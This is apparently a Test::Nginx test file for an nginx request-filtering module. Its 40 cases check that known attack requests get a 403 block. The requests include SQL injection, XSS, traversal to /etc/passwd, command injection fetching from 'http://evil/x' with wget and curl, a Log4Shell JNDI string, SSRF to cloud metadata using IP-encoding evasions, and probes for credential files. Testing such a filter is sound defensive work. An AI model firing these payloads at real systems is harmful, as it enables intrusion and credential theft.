# One true-positive per category that is exercisable through the request URI /
# query string. Header-only and body-only categories are covered in 03/04.
use Test::Nginx::Socket 'no_plan';

repeat_each(1);
no_long_string();
run_tests();

__DATA__

=== TEST 1: sqli
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?id=1%20union%20select%20password%20from%20users
--- error_code: 403

=== TEST 2: xss
# xss is query-ineligible (NO_QUERY -- see t/05 TEST 71): "<script>" as a raw
# query VALUE is reflected-search traffic the module deliberately does not block.
# xss still fires at full strength in a header; probe it via Referer so this
# stays a real xss positive.
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t
--- more_headers
Referer: http://x/?q=%3Cscript%3Ealert(1)%3C/script%3E
--- error_code: 403

=== TEST 3: path traversal
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?file=../../../../etc/passwd
--- error_code: 403

=== TEST 4: overlong UTF-8 traversal
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?p=%c0%af%c0%af
--- error_code: 403

=== TEST 5: command injection
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?host=127.0.0.1;wget%20http://evil/x
--- error_code: 403

=== TEST 6: LFI/RFI wrapper
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?page=php://filter/read=convert.base64-encode/resource=index
--- error_code: 403

=== TEST 7: CRLF injection
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?next=%0d%0aSet-Cookie:%20evil=1
--- error_code: 403

=== TEST 8: null byte
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?file=image.php%00.png
--- error_code: 403

=== TEST 9: template / JNDI (Log4Shell)
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?x=%24%7Bjndi:ldap://evil/a%7D
--- error_code: 403

=== TEST 10: PHP RCE chain (PHPUnit eval-stdin)
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
--- error_code: 403

=== TEST 11: Struts OGNL in query
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?x=%25%7B(%23a)%7D
--- error_code: 403

=== TEST 12: Java runtime eval
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?x=java.lang.Runtime
--- error_code: 403

=== TEST 13: Rails YAML deserialization
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?x=!ruby/object:Gem::Requirement
--- error_code: 403

=== TEST 14: Drupalgeddon2
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?name%5B%23post_render%5D%5B%5D=passthru&name%5B%23markup%5D=id
--- error_code: 403

=== TEST 15: vBulletin RCE
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?widgetConfig[code]=echo
--- error_code: 403

=== TEST 16: sensitive file probe (.env)
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t/.env
--- error_code: 403

=== TEST 17: webshell probe
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t/c99.php
--- error_code: 403

=== TEST 18: cloud metadata SSRF
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?url=http://169.254.169.254/latest/meta-data/
--- error_code: 403

=== TEST 19: SQLi UNION separated by a decoded tab
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?id=1%20union%09select%20password%20from%20users
--- error_code: 403

=== TEST 20: SQLi UNION separated by a comment
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?id=1%20union/**/select%20password%20from%20users
--- error_code: 403

=== TEST 21: XSS data URI
# xss is query-ineligible; probe the header position where it still blocks.
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t
--- more_headers
Referer: http://x/?next=data:text/html;base64,PHNjcmlwdD4=
--- error_code: 403

=== TEST 22: command injection with an AND separator
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?host=127.0.0.1%26%26curl%20http://evil/x
--- error_code: 403

=== TEST 23: gcloud credential-store probe
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t/.config/gcloud/application_default_credentials.json
--- error_code: 403

=== TEST 24: Rails master-key probe
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t/config/master.key
--- error_code: 403

=== TEST 25: octal cloud-metadata IP evasion
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?url=http://025177524776/latest/meta-data/
--- error_code: 403

=== TEST 26: IPv4-mapped IPv6 cloud-metadata evasion
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?url=http://[::ffff:a9fe:a9fe]/latest/meta-data/
--- error_code: 403

=== TEST 27: SQL Server OLE automation escape primitive
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?id=1;EXEC%20sp_OACreate%20'WScript.Shell'
--- error_code: 403

=== TEST 28: XSS entity-encoded javascript protocol
# xss is query-ineligible; probe the header position where it still blocks.
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t
--- more_headers
Referer: http://x/?next=javascript%26%23x3a%3Balert(1)
--- error_code: 403

=== TEST 29: command injection with an OR separator
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?host=127.0.0.1%7C%7Cwget%20http://evil/x
--- error_code: 403

=== TEST 30: proc maps disclosure target
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t/proc/self/maps
--- error_code: 403

=== TEST 31: Unicode-stop cloud-metadata IP evasion
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?url=http://169%E3%80%82254%E3%80%82169%E3%80%82254/latest/meta-data/
--- error_code: 403

=== TEST 32: loopback Docker API SSRF
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?url=http://0x7f000001:2375/containers/json
--- error_code: 403

=== TEST 33: sudoers disclosure target
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t/etc/sudoers
--- error_code: 403

=== TEST 34: package-manager credential probe
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t/.config/composer/auth.json
--- error_code: 403

=== TEST 35: sensitive_file still blocks in the request PATH (NO_QUERY is path-safe)
# The NO_QUERY narrowing applies ONLY to the query component. A sensitive-file
# name in the PATH is a file actually being requested and must still 403 -- if
# the split accidentally masked the path this goes 200.
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t/etc/passwd
--- error_code: 403

=== TEST 36: xss still blocks in a header value (NO_QUERY does not touch headers)
# xss is query-ineligible but the request PATH and headers still carry the full
# table. A Referer echoing a script tag must still 403 -- the narrowing is
# scoped to the query component of the target, nothing else.
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t
--- more_headers
Referer: http://x/<script>alert(1)</script>
--- error_code: 403

=== TEST 37: traversal still blocks in a query VALUE (only xss/sensitive_file are NO_QUERY)
# The narrowing is deliberately minimal: traversal has a real query-delivered
# attack (?file=../../), so it stays query-eligible and must still 403.
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?file=../../../../etc/shadow
--- error_code: 403

=== TEST 38: lfi still blocks in a query VALUE
# lfi ?f=http://... is a real query-delivered attack and stays eligible.
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?page=php://filter/convert.base64-encode/resource=index
--- error_code: 403

=== TEST 39: sqli still blocks in a query VALUE
# sqli is query-eligible; a real UNION SELECT in the query must still 403.
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t?id=1%20union%20select%20password%20from%20users
--- error_code: 403

=== TEST 40: xss still blocks in the request PATH (path-recovery pass, not headers)
# The two-pass URI scan recovers BOTH query-ineligible categories in the path,
# not just sensitive_file (TEST 35). Percent-encode the tag so it survives to
# PRECONTENT rather than being rejected on the raw path; the decoded scan then
# matches "<script>" in the path component, where XSS has attack meaning.
--- config
    location /t { shield block; empty_gif; }
--- request
GET /t/%3Cscript%3Ealert(1)%3C/script%3E
--- error_code: 403
